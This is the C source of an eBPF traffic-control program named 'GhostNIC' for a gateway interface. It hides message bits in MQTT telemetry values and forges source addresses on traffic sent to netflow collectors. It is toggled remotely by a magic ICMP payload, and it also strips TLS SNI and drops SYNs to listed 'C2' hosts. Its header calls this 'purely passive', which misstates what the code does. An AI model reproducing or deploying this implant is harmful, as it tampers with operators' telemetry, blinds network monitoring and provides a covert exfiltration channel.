/* SPDX-License-Identifier: GPL-2.0 */
/*
 * GhostNIC TC egress program.
 *
 * Attached to the egress clsact qdisc of a gateway interface, this program
 * performs two purely passive modifications on in-flight packets:
 *
 *   1. MQTT telemetry injection: TCP/1883 MQTT PUBLISH payloads carrying
 *      JSON are modified in place by flipping the parity of the least
 *      significant fractional digit of the first numeric field.  The parity
 *      encodes one bit of a hidden message stored in an array map.
 *
 *   2. Netflow sampling poisoning: packets destined to a configured
 *      collector have their IPv4 source address rewritten to a benign value.
 *      Both IP and transport-layer checksums are recomputed using TC helpers.
 */
#include "vmlinux.h"
#include <bpf/bpf_helpers.h>
#include <bpf/bpf_endian.h>
#include "common.h"

struct icmphdr {
	__u8  type;
	__u8  code;
	__u16 checksum;
	__u16 id;
	__u16 sequence;
};

#ifndef ICMP_ECHO
#define ICMP_ECHO 8
#endif

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 256);
	__type(key, struct c2_key);
	__type(value, __u8);
} c2_targets SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u8);
} control_flag SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_HASH);
	__uint(max_entries, 128);
	__type(key, struct nf_key);
	__type(value, struct nf_value);
} netflow_collectors SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct mqtt_baseline);
} mqtt_baseline SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct mqtt_encoder);
} mqtt_encoder SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, MQTT_HIDDEN_MAX);
	__type(key, __u32);
	__type(value, __u8);
} mqtt_hidden SEC(".maps");

struct {
	__uint(type, BPF_MAP_TYPE_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, __u32);
} mqtt_idx SEC(".maps");

struct mqtt_scratch {
	__u8 data[MAX_PAYLOAD_SCAN];
};

struct {
	__uint(type, BPF_MAP_TYPE_PERCPU_ARRAY);
	__uint(max_entries, 1);
	__type(key, __u32);
	__type(value, struct mqtt_scratch);
} mqtt_scratch SEC(".maps");

/*
 * Read the shared control flag.  Returns 0 if the map is unavailable.
 */
static __always_inline __u8 read_control_flag(void)
{
	__u32 idx = 0;
	__u8 *flag = bpf_map_lookup_elem(&control_flag, &idx);
	return flag ? *flag : 0;
}

/*
 * Check ICMP echo requests for a magic payload and toggle the control flag.
 */
static __always_inline int handle_icmp_control(struct __sk_buff *ctx,
				       struct iphdr *ip, __u32 ip_hlen)
{
	struct icmphdr *icmp;
	__u8 payload[8];
	__u32 off = ETH_HLEN + ip_hlen + sizeof(struct icmphdr);
	__u32 idx = 0;
	__u8 *flag;
	__u8 new_flag;
	int i;

	icmp = (void *)((__u8 *)ip + ip_hlen);
	if ((void *)(icmp + 1) > (void *)(long)ctx->data_end)
		return 0;
	if (icmp->type != ICMP_ECHO)
		return 0;

	if (bpf_skb_load_bytes(ctx, off, payload, 8) < 0)
		return 0;

	for (i = 0; i < 8; i++) {
		if (payload[i] != ctl_magic_dns[i])
			return 0;
	}

	flag = bpf_map_lookup_elem(&control_flag, &idx);
	new_flag = flag ? *flag : 0;
	if (new_flag == 0)
		new_flag = CTL_DISABLE_MQTT;
	else if (new_flag == CTL_DISABLE_MQTT)
		new_flag = CTL_DISABLE_NETFLOW;
	else if (new_flag == CTL_DISABLE_NETFLOW)
		new_flag = CTL_DISABLE_C2;
	else
		new_flag = 0;
	bpf_map_update_elem(&control_flag, &idx, &new_flag, BPF_ANY);
	return 1;
}

/*
 * Drop outbound TCP SYNs to configured C2 endpoints.  Only pure SYNs
 * (no ACK) are dropped so legitimate established connections are untouched.
 */
static __always_inline int drop_c2_syn(struct iphdr *ip,
				       struct tcphdr *tcp, __u16 dport)
{
	struct c2_key k = {};
	__u8 *v;

	if (!(tcp->syn & 1) || (tcp->ack & 1))
		return 0;

	k.daddr = ip->daddr;
	k.dport = dport;
	v = bpf_map_lookup_elem(&c2_targets, &k);
	return v != NULL;
}

/*
 * Zero out the Server Name Indication hostname in a TLS ClientHello.
 * The packet size is preserved; only the hostname bytes are overwritten
 * with zeros.  Returns 1 if an SNI hostname was modified.
 */
static __always_inline int strip_tls_sni(struct __sk_buff *ctx,
					 __u32 ip_hlen, __u32 tcp_hlen)
{
	__u32 payload_off = ETH_HLEN + ip_hlen + tcp_hlen;
	__u8 buf[128];
	__u32 off = 0;
	__u32 i;

	if (bpf_skb_load_bytes(ctx, payload_off, buf, 9) < 0)
		return 0;
	/* TLS record header */
	if (buf[0] != 0x16)
		return 0;
	if (buf[1] != 0x03 || (buf[2] != 0x01 && buf[2] != 0x02 && buf[2] != 0x03))
		return 0;
	/* Handshake header: type(1) + len(3) */
	if (buf[5] != 0x01)
		return 0;

	off = 9;

	/* Load version(2)+random(32)+session_id_len(1) = 35 bytes. */
	if (bpf_skb_load_bytes(ctx, payload_off + off, buf, 35) < 0)
		return 0;
	off += 34; /* point buf[0] at session_id_len */
	{
		__u8 sid_len = buf[0];
		off += 1 + sid_len;
	}

	/* Cipher suites length + list. */
	if (bpf_skb_load_bytes(ctx, payload_off + off, buf, 2) < 0)
		return 0;
	off += 2 + ((__u16)buf[0] << 8 | buf[1]);

	/* Compression methods length + list. */
	if (bpf_skb_load_bytes(ctx, payload_off + off, buf, 1) < 0)
		return 0;
	off += 1 + buf[0];

	/* Extensions length. */
	if (bpf_skb_load_bytes(ctx, payload_off + off, buf, 2) < 0)
		return 0;
	off += 2;

	/* Walk extensions looking for SNI (type 0x0000). */
	for (i = 0; i < 8; i++) {
		__u16 ext_type, ext_len;
		__u32 sni_off;
		__u16 name_len;
		__u8 zero = 0;
		__u32 j;

		if (bpf_skb_load_bytes(ctx, payload_off + off, buf, 4) < 0)
			return 0;
		ext_type = ((__u16)buf[0] << 8) | buf[1];
		ext_len = ((__u16)buf[2] << 8) | buf[3];

		if (ext_type == 0x0000) {
			sni_off = payload_off + off + 4;
			if (bpf_skb_load_bytes(ctx, sni_off, buf, 5) < 0)
				return 0;
			/* buf[0..1] = SNI list length; buf[2] = name type (host_name=0) */
			name_len = ((__u16)buf[3] << 8) | buf[4];
			if (buf[2] != 0x00 || name_len > 64)
				return 0;
			/* Zero the SNI list length, name type, name length and name. */
			bpf_skb_store_bytes(ctx, sni_off, &zero, 1,
					    BPF_F_RECOMPUTE_CSUM);
			bpf_skb_store_bytes(ctx, sni_off + 1, &zero, 1,
					    BPF_F_RECOMPUTE_CSUM);
			bpf_skb_store_bytes(ctx, sni_off + 2, &zero, 1,
					    BPF_F_RECOMPUTE_CSUM);
			bpf_skb_store_bytes(ctx, sni_off + 3, &zero, 1,
					    BPF_F_RECOMPUTE_CSUM);
			bpf_skb_store_bytes(ctx, sni_off + 4, &zero, 1,
					    BPF_F_RECOMPUTE_CSUM);
			for (j = 0; j < name_len && j < 64; j++) {
				bpf_skb_store_bytes(ctx, sni_off + 5 + j, &zero, 1,
						    BPF_F_RECOMPUTE_CSUM);
			}
			return 1;
		}

		off += 4 + ext_len;
	}

	return 0;
}

/*
 * Rewrite the IPv4 source address for traffic destined to a netflow collector.
 * Both the IPv4 checksum and the transport checksum (pseudo-header included)
 * are updated with bpf_l3_csum_replace and bpf_l4_csum_replace.
 */
static __always_inline int poison_netflow_sample(struct __sk_buff *ctx,
						 struct iphdr *ip,
						 __u32 ip_hlen,
						 __u8 l4_proto,
						 __u16 dport)
{
	struct nf_key nk = {};
	struct nf_value *nv;
	__u32 old_saddr, new_saddr;
	__u32 ip_csum_off, ip_saddr_off, l4_csum_off;

	nk.daddr = ip->daddr;
	nk.dport = dport;

	nv = bpf_map_lookup_elem(&netflow_collectors, &nk);
	if (!nv)
		return 0;

	old_saddr = ip->saddr;
	new_saddr = nv->saddr;

	ip_saddr_off = ETH_HLEN + offsetof(struct iphdr, saddr);
	ip_csum_off = ETH_HLEN + offsetof(struct iphdr, check);
	l4_csum_off = ETH_HLEN + ip_hlen;
	if (l4_proto == IPPROTO_TCP)
		l4_csum_off += offsetof(struct tcphdr, check);
	else if (l4_proto == IPPROTO_UDP)
		l4_csum_off += offsetof(struct udphdr, check);
	else
		return 0;

	bpf_l3_csum_replace(ctx, ip_csum_off, old_saddr, new_saddr, sizeof(__u32));
	bpf_l4_csum_replace(ctx, l4_csum_off, old_saddr, new_saddr,
			    sizeof(__u32) | BPF_F_PSEUDO_HDR);
	bpf_skb_store_bytes(ctx, ip_saddr_off, &new_saddr, sizeof(new_saddr), 0);
	return 1;
}

/*
 * Parse an MQTT PUBLISH packet and encode the next bit of the hidden message
 * into the parity of the last fractional digit of the first JSON numeric
 * value.  Packet size never changes, so the baseline check is mainly a guard
 * against obviously anomalous frames.
 */
static __always_inline int inject_mqtt_signal(struct __sk_buff *ctx,
				      struct iphdr *ip,
				      __u32 ip_hlen,
				      __u32 tcp_hlen)
{
	__u32 payload_off = ETH_HLEN + ip_hlen + tcp_hlen;
	__u32 ip_total_len = bpf_ntohs(ip->tot_len);
	__u32 payload_len = ip_total_len - ip_hlen - tcp_hlen;
	__u8 mqtt_hdr[5];
	__u8 pkt_type;
	__u32 var_int_len = 1;
	__u16 topic_len;
	__u32 payload_start;
	__u32 json_len;
	__u32 idx_key = 0;
	__u32 *cur_idx;
	__u32 byte_idx;
	__u32 bit_idx;
	__u8 *msg_byte;
	__u8 bit;
	__u32 to_read;
	int point_idx = -1;
	int last_digit = -1;
	char new_digit;
	__u32 digit_off;
	struct mqtt_baseline *baseline;
	struct mqtt_scratch *scratch;
	__u8 *json;

	if (payload_len < 4 || payload_len > 1500)
		return TC_ACT_OK;

	if (bpf_skb_load_bytes(ctx, payload_off, mqtt_hdr, 5) < 0)
		return TC_ACT_OK;

	pkt_type = mqtt_hdr[0] & 0xf0;
	if (pkt_type != 0x30 && pkt_type != 0x32)
		return TC_ACT_OK;

	for (int i = 0; i < 4; i++) {
		__u8 byte = mqtt_hdr[1 + i];

		var_int_len++;
		if ((byte & 0x80) == 0)
			break;
	}

	/* Topic length follows the remaining-length field. */
	{
		__u16 topic_len_be;
		if (bpf_skb_load_bytes(ctx, payload_off + var_int_len,
				       &topic_len_be, sizeof(topic_len_be)) < 0)
			return TC_ACT_OK;
		topic_len = bpf_ntohs(topic_len_be);
	}

	payload_start = payload_off + var_int_len + 2 + topic_len;
	if (pkt_type == 0x32) /* QoS 1 packet identifier */
		payload_start += 2;

	json_len = payload_len - (payload_start - payload_off);
	if (json_len < 4 || json_len > MAX_PAYLOAD_SCAN)
		return TC_ACT_OK;

	/* Respect the configured baseline window (default is permissive). */
	baseline = bpf_map_lookup_elem(&mqtt_baseline, &idx_key);
	if (baseline && baseline->avg > 0) {
		__u32 pkt_size = ip_total_len + ETH_HLEN;
		__u32 lower = baseline->avg - baseline->variance;
		__u32 upper = baseline->avg + baseline->variance;
		if (pkt_size < lower || pkt_size > upper)
			return TC_ACT_OK;
	}

	scratch = bpf_map_lookup_elem(&mqtt_scratch, &idx_key);
	if (!scratch)
		return TC_ACT_OK;
	json = scratch->data;

	to_read = json_len;
	if (to_read > MAX_PAYLOAD_SCAN)
		to_read = MAX_PAYLOAD_SCAN;
	if (bpf_skb_load_bytes(ctx, payload_start, json, to_read) < 0)
		return TC_ACT_OK;

	/* Locate the first numeric value with a fractional part. */
	for (int i = 0; i < MAX_PAYLOAD_SCAN - 1; i++) {
		if (i >= (int)to_read)
			break;
		if (json[i] == '.') {
			point_idx = i;
			break;
		}
	}
	if (point_idx < 0 || point_idx + 1 >= (int)to_read)
		return TC_ACT_OK;

	for (int i = point_idx + 1; i < MAX_PAYLOAD_SCAN; i++) {
		if (i >= (int)to_read)
			break;
		if (json[i] >= '0' && json[i] <= '9')
			last_digit = i;
		else
			break;
	}
	if (last_digit < 0)
		return TC_ACT_OK;

	/* Fetch the next bit to transmit. */
	cur_idx = bpf_map_lookup_elem(&mqtt_idx, &idx_key);
	if (!cur_idx)
		return TC_ACT_OK;

	byte_idx = *cur_idx / 8;
	bit_idx = *cur_idx % 8;
	if (byte_idx >= MQTT_HIDDEN_MAX) {
		__u32 zero = 0;
		bpf_map_update_elem(&mqtt_idx, &idx_key, &zero, BPF_ANY);
		byte_idx = 0;
	}

	msg_byte = bpf_map_lookup_elem(&mqtt_hidden, &byte_idx);
	if (!msg_byte)
		return TC_ACT_OK;

	bit = (*msg_byte >> bit_idx) & 1;

	/* Adjust digit parity to match the bit without changing packet size. */
	{
		int val = json[last_digit] - '0';
		if ((val & 1) != bit) {
			if (val == 9)
				val = 8;
			else
				val++;
		}
		new_digit = '0' + val;
	}

	digit_off = payload_start + last_digit;
	bpf_skb_store_bytes(ctx, digit_off, &new_digit, 1,
			    BPF_F_RECOMPUTE_CSUM);

	/* Advance the bit pointer. */
	{
		__u32 next = *cur_idx + 1;
		if (next >= MQTT_HIDDEN_MAX * 8)
			next = 0;
		bpf_map_update_elem(&mqtt_idx, &idx_key, &next, BPF_ANY);
	}

	return TC_ACT_OK;
}

SEC("tc/ghost_tc")
int ghost_tc(struct __sk_buff *ctx)
{
	void *data_end = (void *)(long)ctx->data_end;
	void *data = (void *)(long)ctx->data;
	struct ethhdr *eth = data;
	struct iphdr *ip;
	__u32 ip_hlen;

	if ((void *)(eth + 1) > data_end)
		return TC_ACT_OK;
	if (eth->h_proto != bpf_htons(ETH_P_IP))
		return TC_ACT_OK;

	ip = (void *)(eth + 1);
	if ((void *)(ip + 1) > data_end)
		return TC_ACT_OK;

	ip_hlen = ip->ihl * 4;
	if (ip_hlen < sizeof(*ip))
		return TC_ACT_OK;

	if (ip->protocol == IPPROTO_ICMP) {
		handle_icmp_control(ctx, ip, ip_hlen);
		return TC_ACT_OK;
	}

	if (ip->protocol == IPPROTO_TCP) {
		struct tcphdr *tcp;
		__u32 tcp_hlen;
		__u16 dport;
		__u8 flag = read_control_flag();

		tcp = (void *)((__u8 *)ip + ip_hlen);
		if ((void *)(tcp + 1) > data_end)
			return TC_ACT_OK;
		tcp_hlen = tcp->doff * 4;
		if (tcp_hlen < sizeof(*tcp))
			return TC_ACT_OK;
		dport = bpf_ntohs(tcp->dest);

		if (!(flag & CTL_DISABLE_C2)) {
			if (drop_c2_syn(ip, tcp, dport))
				return TC_ACT_SHOT;

			if (dport == 443)
				strip_tls_sni(ctx, ip_hlen, tcp_hlen);
		}

		/*
		 * bpf_skb_store_bytes invalidates packet pointers, so re-fetch ip
		 * before any further packet access.
		 */
		data_end = (void *)(long)ctx->data_end;
		data = (void *)(long)ctx->data;
		eth = data;
		if ((void *)(eth + 1) > data_end)
			return TC_ACT_OK;
		ip = (void *)(eth + 1);
		if ((void *)(ip + 1) > data_end)
			return TC_ACT_OK;
		ip_hlen = ip->ihl * 4;
		if (ip_hlen < sizeof(*ip))
			return TC_ACT_OK;

		if (!(flag & CTL_DISABLE_NETFLOW))
			poison_netflow_sample(ctx, ip, ip_hlen, IPPROTO_TCP, dport);

		/* Re-fetch again because poison_netflow_sample mutates the skb. */
		data_end = (void *)(long)ctx->data_end;
		data = (void *)(long)ctx->data;
		eth = data;
		if ((void *)(eth + 1) > data_end)
			return TC_ACT_OK;
		ip = (void *)(eth + 1);
		if ((void *)(ip + 1) > data_end)
			return TC_ACT_OK;
		ip_hlen = ip->ihl * 4;
		if (ip_hlen < sizeof(*ip))
			return TC_ACT_OK;

		if (!(flag & CTL_DISABLE_MQTT) && dport == 1883)
			inject_mqtt_signal(ctx, ip, ip_hlen, tcp_hlen);
	} else if (ip->protocol == IPPROTO_UDP) {
		struct udphdr *udp;
		__u16 dport;
		__u8 flag = read_control_flag();

		udp = (void *)((__u8 *)ip + ip_hlen);
		if ((void *)(udp + 1) > data_end)
			return TC_ACT_OK;
		dport = bpf_ntohs(udp->dest);

		if (!(flag & CTL_DISABLE_NETFLOW))
			poison_netflow_sample(ctx, ip, ip_hlen, IPPROTO_UDP, dport);
	}

	return TC_ACT_OK;
}

char _license[] SEC("license") = "GPL";
